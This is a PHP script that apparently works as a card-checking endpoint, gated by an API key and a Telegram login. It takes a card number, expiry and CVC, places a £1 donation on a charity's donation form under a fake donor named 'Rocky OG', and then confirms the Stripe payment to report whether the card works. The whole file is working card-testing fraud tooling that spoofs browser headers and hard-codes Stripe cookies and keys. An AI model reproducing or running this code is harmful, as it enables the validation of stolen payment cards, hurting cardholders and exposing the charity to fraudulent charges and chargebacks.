<?php
// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../logs/error.log');

// Include API key validation
require_once __DIR__ . '/validkey.php';
 $validation = validateApiKey();

if (!$validation['valid']) {
    header('Content-Type: application/json');
    echo json_encode($validation['response']);
    exit;
}

// Validate session for non-admin users
if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
    if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
        error_log("Unauthorized access to stripegbp.php: Invalid session");
        http_response_code(401);
        echo json_encode(['status' => 'ERROR', 'message' => 'Unauthorized access']);
        exit;
    }
}

// Set content type to JSON
header('Content-Type: application/json');

// Get card details from POST request
 $cardNumber = $_POST['card']['number'] ?? '';
 $expMonth = $_POST['card']['exp_month'] ?? '';
 $expYear = $_POST['card']['exp_year'] ?? '';
 $cvc = $_POST['card']['cvc'] ?? '';

// Validate card details
if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card details']);
    exit;
}

// Format year to 4 digits if needed
if (strlen($expYear) == 2) {
    $expYear = '20' . $expYear;
}

// Initialize cookie jar for session continuity
 $cookieJar = tempnam(sys_get_temp_dir(), 'cookies');

// Function to generate a random boundary string for multipart form data
function generateBoundary() {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $boundary = '----WebKitFormBoundary';
    for ($i = 0; $i < 16; $i++) {
        $boundary .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $boundary;
}

// Function to submit donation to hiburma.org and get clientSecret
function submitDonation($cookieJar) {
    $boundary = generateBoundary();
    
    // Form data for hiburma.org
    $formFields = [
        'amount' => '1',
        'currency' => 'GBP',
        'donationType' => 'single',
        'formId' => '542',
        'gatewayId' => 'stripe_payment_element',
        'firstName' => 'Rocky',
        'lastName' => 'OG',
        'email' => 'zerotracehacked@gmail.com',
        'donationBirthday' => '',
        'originUrl' => 'https://www.hiburma.org/donate-us/',
        'isEmbed' => 'true',
        'embedId' => 'give-form-shortcode-1',
        'locale' => 'en_GB',
        'gatewayData[stripePaymentMethod]' => 'card',
        'gatewayData[stripePaymentMethodIsCreditCard]' => 'true',
        'gatewayData[formId]' => '542',
        'gatewayData[stripeKey]' => 'pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1',
        'gatewayData[stripeConnectedAccountId]' => 'acct_1REnik2N0Z39Zjtm'
    ];
    
    // Construct multipart form data
    $body = '';
    foreach ($formFields as $key => $value) {
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"$key\"\r\n\r\n";
        $body .= "$value\r\n";
    }
    $body .= "--$boundary--\r\n";
    
    $cookies = [
        '__stripe_mid' => '4238f501-2d68-4f90-be22-2c49f1089f3f134e2b',
        '__stripe_sid' => '1abca7c6-7f14-45d7-99f5-e3cbd0840a1a67f215',
    ];
    
    $headers = [
        'accept: application/json',
        'accept-language: en-US,en;q=0.9',
        'content-type: multipart/form-data; boundary=' . $boundary,
        'origin: https://www.hiburma.org',
        'priority: u=1, i',
        'referer: https://www.hiburma.org/?givewp-route=donation-form-view&form-id=542&locale=en_GB',
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    ];
    
    $params = [
        'givewp-route' => 'donate',
        'givewp-route-signature' => '302c24be613870d57069f2fd6a01e1a1',
        'givewp-route-signature-id' => 'givewp-donate',
        'givewp-route-signature-expiration' => '1761332658',
    ];
    
    $ch = curl_init('https://www.hiburma.org/?' . http_build_query($params));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    curl_setopt($ch, CURLOPT_COOKIE, http_build_query($cookies));
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $result = json_decode($response, true);
    curl_close($ch);
    
    return ['response' => $result, 'httpCode' => $httpCode, 'cookieJar' => $cookieJar];
}

// Function to confirm payment with Stripe
function confirmPayment($clientSecret, $paymentIntentId, $returnUrl, $cardNumber, $cvc, $expYear, $expMonth, $cookieJar) {
    $headers = [
        'accept: application/json',
        'accept-encoding: gzip, deflate, br, zstd',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://js.stripe.com',
        'priority: u=1, i',
        'referer: https://js.stripe.com/',
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    ];
    
    // Generate random IDs
    $clientSessionId = bin2hex(random_bytes(16));
    $elementsSessionConfigId = bin2hex(random_bytes(16));
    $guid = bin2hex(random_bytes(16));
    $muid = '4238f501-2d68-4f90-be22-2c49f1089f3f134e2b';
    $sid = '1abca7c6-7f14-45d7-99f5-e3cbd0840a1a67f215';
    
    // Strip query parameters from return_url
    $parsedUrl = parse_url($returnUrl);
    $cleanReturnUrl = $parsedUrl['scheme'] . '://' . $parsedUrl['host'] . $parsedUrl['path'];
    
    // Construct Stripe payment confirmation data
    $stripeData = http_build_query([
        'return_url' => $cleanReturnUrl,
        'payment_method_data[billing_details][name]' => 'Rocky OG',
        'payment_method_data[billing_details][email]' => 'zerotracehacked@gmail.com',
        'payment_method_data[billing_details][address][country]' => 'US',
        'payment_method_data[billing_details][address][postal_code]' => '10001',
        'payment_method_data[type]' => 'card',
        'payment_method_data[card][number]' => $cardNumber,
        'payment_method_data[card][cvc]' => $cvc,
        'payment_method_data[card][exp_year]' => $expYear,
        'payment_method_data[card][exp_month]' => $expMonth,
        'payment_method_data[allow_redisplay]' => 'unspecified',
        'payment_method_data[payment_user_agent]' => 'stripe.js/6440ee8f22; stripe-js-v3/6440ee8f22; payment-element; autopm',
        'payment_method_data[referrer]' => 'https://www.hiburma.org',
        'payment_method_data[time_on_page]' => rand(1000000, 2000000),
        'payment_method_data[client_attribution_metadata][client_session_id]' => $clientSessionId,
        'payment_method_data[client_attribution_metadata][merchant_integration_source]' => 'elements',
        'payment_method_data[client_attribution_metadata][merchant_integration_subtype]' => 'payment-element',
        'payment_method_data[client_attribution_metadata][merchant_integration_version]' => '2021',
        'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]' => 'deferred',
        'payment_method_data[client_attribution_metadata][payment_method_selection_flow]' => 'automatic',
        'payment_method_data[client_attribution_metadata][elements_session_config_id]' => $elementsSessionConfigId,
        'payment_method_data[guid]' => $guid,
        'payment_method_data[muid]' => $muid,
        'payment_method_data[sid]' => $sid,
        'expected_payment_method_type' => 'card',
        'client_context[currency]' => 'gbp',
        'client_context[mode]' => 'payment',
        'use_stripe_sdk' => 'true',
        'key' => 'pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1',
        '_stripe_account' => 'acct_1REnik2N0Z39Zjtm',
        'client_attribution_metadata[client_session_id]' => $clientSessionId,
        'client_attribution_metadata[merchant_integration_source]' => 'elements',
        'client_attribution_metadata[merchant_integration_subtype]' => 'payment-element',
        'client_attribution_metadata[merchant_integration_version]' => '2021',
        'client_attribution_metadata[payment_intent_creation_flow]' => 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]' => 'automatic',
        'client_attribution_metadata[elements_session_config_id]' => $elementsSessionConfigId,
        'client_secret' => $clientSecret,
    ]);
    
    $ch = curl_init("https://api.stripe.com/v1/payment_intents/$paymentIntentId/confirm");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $stripeData);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $result = json_decode($response, true);
    curl_close($ch);
    
    return ['response' => $result, 'httpCode' => $httpCode];
}

// Record start time
 $startTime = microtime(true);

// Submit donation to get clientSecret
 $donationResult = submitDonation($cookieJar);
 $cookieJar = $donationResult['cookieJar'];
 $donationResponse = $donationResult['response'];
 $httpCode = $donationResult['httpCode'];

if ($httpCode != 200 || !isset($donationResponse['data']['clientSecret'])) {
    $errorMsg = $donationResponse['error']['message'] ?? 'Failed to get clientSecret';
    error_log("Donation API call failed: $errorMsg");
    unlink($cookieJar);
    $endTime = microtime(true);
    $timeTaken = number_format($endTime - $startTime, 2);
    echo json_encode([
        'status' => 'ERROR',
        'message' => $errorMsg,
        'time_taken' => "$timeTaken seconds"
    ]);
    exit;
}

 $clientSecret = $donationResponse['data']['clientSecret'];
 $returnUrl = $donationResponse['data']['returnUrl'];
 $paymentIntentId = explode('_secret_', $clientSecret)[0];

// Confirm payment with Stripe
 $stripeResult = confirmPayment($clientSecret, $paymentIntentId, $returnUrl, $cardNumber, $cvc, $expYear, $expMonth, $cookieJar);
 $stripeResponse = $stripeResult['response'];
 $httpCode = $stripeResult['httpCode'];

// Calculate time taken
 $endTime = microtime(true);
 $timeTaken = number_format($endTime - $startTime, 2);

// Clean up cookie file
unlink($cookieJar);

if ($httpCode != 200 || isset($stripeResponse['error'])) {
    $errorCode = $stripeResponse['error']['code'] ?? 'unknown_error';
    $errorMessage = $stripeResponse['error']['message'] ?? 'Unknown error';
    echo json_encode([
        'status' => $errorCode,
        'message' => $errorMessage,
        'time_taken' => "$timeTaken seconds"
    ]);
    exit;
}

// Success response
echo json_encode([
    'status' => 'success',
    'message' => 'PAYMENT_SUCCESS',
    'time_taken' => "$timeTaken seconds"
]);
?>
